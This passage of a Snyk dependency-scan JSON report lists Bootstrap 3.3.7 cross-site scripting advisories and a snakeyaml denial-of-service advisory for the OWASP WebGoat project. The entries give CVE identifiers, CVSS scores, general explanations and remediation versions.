Commit](https://github.com/twbs/bootstrap/pull/28236/commits/5efa9b531d25927b907e3fa24b818608bc38a2f0)\n- [GitHub Commit](https://github.com/twbs/bootstrap-rubygem/commit/a63d04c96d14e42492ccdba1d7f3d6ec1af022a9)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/28236)\n- [NPM Security Adviory](https://www.npmjs.com/advisories/891)\n",
      "disclosureTime": "2019-02-11T19:32:59Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.4.1",
        "4.3.1"
      ],
      "id": "SNYK-JAVA-ORGWEBJARS-451160",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "NSP": [
          "891"
        ],
        "CVE": [
          "CVE-2019-8331"
        ],
        "GHSA": [
          "GHSA-9v3m-8fp8-mj99"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-22T17:02:12.908715Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-02-15T19:32:59Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/28236/commits/5efa9b531d25927b907e3fa24b818608bc38a2f0"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap-rubygem/commit/a63d04c96d14e42492ccdba1d7f3d6ec1af022a9"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/28236"
        },
        {
          "title": "NPM Security Adviory",
          "url": "https://www.npmjs.com/advisories/891"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-08T15:23:11.969402Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-05-17T01:11:13.553666Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[, 3.4.1)",
          "[4.0.0,4.3.1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.webjars",
        "artifactId": "bootstrap"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.webjars:bootstrap@3.3.7"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.7"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:13:55.956194Z",
      "credit": [
        "1Jesper1"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `tooltip`, `collapse` and `scrollspy` plugins.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0, 4.1.2 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/149096016f70fd815540d62c0989fd99cdc809e0)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/3229efc0811df29765c1d0a949c85362378b0628)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/3ba186313e9e651bbd52a6a3a0305891dee0a621)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/26630/commits/efca80bb5bb34546a2e7a9488b89f71457d2ad92)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26625)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26627)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/26628)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/27915#issuecomment-452140906)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/26630)\n",
      "disclosureTime": "2018-05-29T21:00:00Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.4.0",
        "4.1.2"
      ],
      "id": "SNYK-JAVA-ORGWEBJARS-451162",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-7mvr-5x2g-wfc8"
        ],
        "CVE": [
          "CVE-2018-14040",
          "CVE-2018-14042"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-07-06T14:09:26.251264Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-06-12T08:15:05Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/149096016f70fd815540d62c0989fd99cdc809e0"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/3229efc0811df29765c1d0a949c85362378b0628"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/3ba186313e9e651bbd52a6a3a0305891dee0a621"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/26630/commits/efca80bb5bb34546a2e7a9488b89f71457d2ad92"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26625"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26627"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/26628"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27915%23issuecomment-452140906"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/26630"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-01-03T16:19:35.710411Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-01T19:22:17.597704Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.4.0)",
          "[4.0.0 ,4.1.2)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.webjars",
        "artifactId": "bootstrap"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.webjars:bootstrap@3.3.7"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.7"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:15:22.528355Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the tooltip `data-viewport` attribute.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0 or higher.\n## References\n- [GetBootsrap Blog](https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/27044)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/27047)\n",
      "disclosureTime": "2018-08-13T05:41:27Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.4.0"
      ],
      "id": "SNYK-JAVA-ORGWEBJARS-451164",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": [
          "CVE-2018-20676"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:41:11.152542Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-10T09:27:20Z",
      "references": [
        {
          "title": "GetBootsrap Blog",
          "url": "https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27044"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/27047"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-01-03T16:26:09.818462Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-01T21:20:52.857798Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.4.0)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.webjars",
        "artifactId": "bootstrap"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.webjars:bootstrap@3.3.7"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.7"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:18:30.678974Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `affix` configuration target property.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0 or higher.\n## References\n- [GetBootstrap Blog](https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/2a5ba23ce8f041f3548317acc992ed8a736b609d)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/27047)\n- [POC: GitHub Issue](https://github.com/twbs/bootstrap/issues/27045)\n",
      "disclosureTime": "2019-01-09T05:29:00Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "3.4.0"
      ],
      "id": "SNYK-JAVA-ORGWEBJARS-451168",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": [
          "CVE-2018-20677"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-24T13:25:49.540636Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-10T09:27:20Z",
      "references": [
        {
          "title": "GetBootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/2a5ba23ce8f041f3548317acc992ed8a736b609d"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/27047"
        },
        {
          "title": "POC: GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27045"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-01-03T16:26:07.960947Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-01T21:20:54.891885Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,3.4.0)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.webjars",
        "artifactId": "bootstrap"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.webjars:bootstrap@3.3.7"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.7"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2019-11-04T11:21:21.218346Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `data-target` attribute.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0, 4.0.0-beta.2 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/9612830701211d757ff95ceccbb494fd2e7ee17e)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/23687/commits/d9be1da55bf0f94a81e8a2c9acf5574fb801306e)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/20184)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/23679)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/23687)\n",
      "disclosureTime": "2016-06-27T17:23:26Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "3.4.0",
        "4.0.0-beta.2"
      ],
      "id": "SNYK-JAVA-ORGWEBJARS-479505",
      "identifiers": {
        "CWE": [
          "CWE-79"
        ],
        "CVE": [
          "CVE-2016-10735"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-12-14T14:40:54.409334Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-19T09:37:48Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/9612830701211d757ff95ceccbb494fd2e7ee17e"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/23687/commits/d9be1da55bf0f94a81e8a2c9acf5574fb801306e"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/20184"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/23679"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/23687"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-01-03T17:42:27.548646Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "severity": "medium",
          "modificationTime": "2022-09-01T19:22:16.465534Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "(,3.4.0)",
          "[4.0.0-alpha,4.0.0-beta.2)"
        ]
      },
      "mavenModuleName": {
        "groupId": "org.webjars",
        "artifactId": "bootstrap"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "org.webjars:bootstrap@3.3.7"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.7"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "alternativeIds": [],
      "creationTime": "2022-05-01T15:16:35.982479Z",
      "credit": [
        "unknown"
      ],
      "cvssScore": 7.5,
      "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to missing nested depth limitation for collections.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174)\n- [BitBucket Issues](https://bitbucket.org/snakeyaml/snakeyaml/issues/525)\n- [GitHub Commit](https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174)\n",
      "disclosureTime": "2022-05-01T13:50:41Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "1.31"
      ],
      "id": "SNYK-JAVA-ORGYAML-2806360",
      "identifiers": {
        "CWE": [
          "CWE-400"
        ],
        "CVE": [
          "CVE-2022-25857",
          "CVE-2022-38749"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-09-18T13:49:26.396777Z",
